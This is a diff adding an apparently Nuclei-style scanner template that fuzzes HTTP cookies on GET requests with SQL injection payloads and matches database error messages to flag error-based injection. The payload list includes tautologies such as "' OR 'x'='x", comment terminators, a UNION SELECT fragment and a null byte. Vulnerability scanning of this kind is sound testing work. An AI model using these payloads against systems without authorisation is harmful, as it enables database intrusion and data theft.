@@ -1,0 +1,59 @@
+id: cookie-fuzzing-error-sqli
+
+info:
+  name: fuzzing error sqli payloads in cookie
+  author: pdteam
+  severity: info
+  description: |
+    This template attempts to find SQL injection vulnerabilities by fuzzing http cookies with SQL injection payloads.
+    Note: this is example template, and payloads/matchers need to be modified appropriately.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          -  len(cookie) > 0
+        condition: and
+    
+    payloads:
+      sqli:
+        - "'"
+        - ''
+        - '`'
+        - '``'
+        - ','
+        - '"'
+        - ""
+        - /
+        - //
+        - \
+        - \\
+        - ;
+        - -- or # 
+        - '" OR 1 = 1 -- -'
+        - ' OR '' = '
+        - '='
+        - 'LIKE'
+        - "'=0--+"
+        -  OR 1=1
+        - "' OR 'x'='x"
+        - "' AND id IS NULL; --"
+        - "'''''''''''''UNION SELECT '2"
+        - '%00'
+    
+    fuzzing:
+      - part: cookie
+        type: postfix
+        mode: single
+        fuzz:
+          - '{{sqli}}'
+  
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "unrecognized token:"
+          - "syntax error"
+          - "null"
+          - "SELECTs to the left and right of UNION do not have the same number of result columns"
